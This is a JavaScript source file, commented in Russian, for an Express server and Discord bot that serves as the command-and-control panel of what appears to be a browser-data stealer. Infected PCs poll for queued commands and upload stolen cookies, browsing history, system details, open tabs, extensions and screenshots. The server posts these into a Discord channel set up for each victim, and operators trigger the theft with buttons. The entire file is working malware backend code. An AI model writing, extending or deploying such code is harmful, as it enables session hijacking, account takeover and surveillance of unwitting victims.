// ================= Server & Discord Bot =================
import express from "express";
import { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } from "discord.js";

const app = express();
app.use(express.json({ limit: "50mb" }));

// ---------------- Environment ----------------
const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;
const CATEGORY_NAME = "Все ПК";

// ---------------- State ----------------
const ONLINE_TIMEOUT = 3 * 60 * 1000; // 3 минуты
const onlinePCs = {};           // { pcId: lastPingTimestamp }
const pendingCommands = {};     // { pcId: [ 'get_cookies', ... ] }
const channelByPC = {};         // { pcId: channelId }
const messagesWithButtons = {}; // { pcId: messageId }

// ---------------- Discord Bot ----------------
const bot = new Client({ intents: [GatewayIntentBits.Guilds] });
bot.once("ready", () => console.log(`✅ Бот вошёл как ${bot.user.tag}`));

// ---------------- Buttons ----------------
function createControlButtons(pcId) {
  return [new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`check_online|${pcId}`).setLabel("Чек онлайн").setStyle(ButtonStyle.Primary),
    new ButtonBuilder().setCustomId(`get_cookies|${pcId}`).setLabel("Запросить куки").setStyle(ButtonStyle.Success),
    new ButtonBuilder().setCustomId(`get_history|${pcId}`).setLabel("Запросить историю").setStyle(ButtonStyle.Success),
    new ButtonBuilder().setCustomId(`get_system|${pcId}`).setLabel("Системная инфо").setStyle(ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId(`get_screenshot|${pcId}`).setLabel("Скриншот").setStyle(ButtonStyle.Secondary)
  )];
}

// ---------------- Interaction Handler ----------------
bot.on("interactionCreate", async interaction => {
  if (!interaction.isButton()) return;
  const [command, ...pcIdParts] = interaction.customId.split("|");
  const pcId = pcIdParts.join("|");
  const lastPing = onlinePCs[pcId];
  const isOnline = lastPing && (Date.now() - lastPing < ONLINE_TIMEOUT);

  if(command === "check_online"){
    await interaction.reply({
      content: isOnline ? `✅ ПК ${pcId} онлайн` : `❌ ПК ${pcId} оффлайн`,
      ephemeral: true
    });
    return;
  }

  if(!isOnline){
    await interaction.reply({ content: `❌ ПК ${pcId} оффлайн`, ephemeral: true });
    return;
  }

  if(!pendingCommands[pcId]) pendingCommands[pcId] = [];
  pendingCommands[pcId].push(command);

  await interaction.reply({ content: `✅ Команда "${command}" отправлена ПК ${pcId}`, ephemeral: true });
});

// ---------------- Channel Helpers ----------------
async function getOrCreateCategory(guild, name){
  const channels = await guild.channels.fetch();
  let category = channels.find(c => c.type === ChannelType.GuildCategory && c.name === name);
  if(!category) category = await guild.channels.create({ name, type: ChannelType.GuildCategory });
  return category;
}

async function getOrCreateTextChannel(guild, name, parentId){
  const channels = await guild.channels.fetch();
  let channel = channels.find(c => c.type === ChannelType.GuildText && c.name === name && c.parentId === parentId);
  if(!channel) channel = await guild.channels.create({ name, type: ChannelType.GuildText, parent: parentId });
  return channel;
}

// ---------------- Server Routes ----------------
app.post("/upload", async (req,res)=>{
  try{
    const { pcId, cookies, history, systemInfo, tabs, extensions, screenshot, command } = req.body;
    if(!pcId) return res.status(400).json({ error:"pcId required" });

    onlinePCs[pcId] = Date.now();

    const guild = await bot.guilds.fetch(GUILD_ID);
    const category = await getOrCreateCategory(guild, CATEGORY_NAME);

    // Корректно fetch канал
    let channel;
    if(channelByPC[pcId]){
      try{ channel = await guild.channels.fetch(channelByPC[pcId]); }
      catch{ channel = await getOrCreateTextChannel(guild, pcId, category.id); }
    } else channel = await getOrCreateTextChannel(guild, pcId, category.id);

    channelByPC[pcId] = channel.id;

    const files = [];
    if(command === 'get_cookies' && cookies) files.push({ attachment: Buffer.from(JSON.stringify(cookies,null,2)), name: `${pcId}-cookies.json` });
    if(command === 'get_history' && history) files.push({ attachment: Buffer.from(JSON.stringify(history,null,2)), name: `${pcId}-history.json` });
    if(command === 'get_system' && systemInfo) files.push({ attachment: Buffer.from(JSON.stringify(systemInfo,null,2)), name: `${pcId}-system.json` });
    if(command === 'get_screenshot' && screenshot) files.push({ attachment: Buffer.from(screenshot,"base64"), name: `${pcId}-screenshot.jpeg` });

    if(files.length) await channel.send({ files });

    // Кнопки один раз
    if(!messagesWithButtons[pcId]){
      const msg = await channel.send({ content:`Управление ПК ${pcId}`, components:createControlButtons(pcId) });
      messagesWithButtons[pcId] = msg.id;
    }

    res.json({ success:true });
  }catch(err){ console.error(err); res.status(500).json({ error:err.message }); }
});

// Ping endpoint
app.post("/ping",(req,res)=>{
  const { pcId } = req.body;
  if(!pcId) return res.status(400).json({ error:"pcId required" });

  onlinePCs[pcId] = Date.now();

  const commands = pendingCommands[pcId] || [];
  pendingCommands[pcId] = [];
  res.json({ commands });
});

// List online PCs
app.get("/online",(req,res)=>{
  const now = Date.now();
  const online = Object.entries(onlinePCs)
    .filter(([_,ts])=>now-ts<ONLINE_TIMEOUT)
    .map(([id])=>id);
  res.json({ online });
});

// Send command via API
app.post("/command",(req,res)=>{
  const { pcId, command } = req.body;
  if(!pcId || !command) return res.status(400).json({ error:"pcId and command required" });

  if(!pendingCommands[pcId]) pendingCommands[pcId] = [];
  pendingCommands[pcId].push(command);
  res.json({ success:true });
});

// ---------------- Server Start ----------------
const PORT = process.env.PORT || 3000;
app.listen(PORT, ()=>console.log(`🚀 Сервер слушает порт ${PORT}`));
bot.login(DISCORD_BOT_TOKEN);
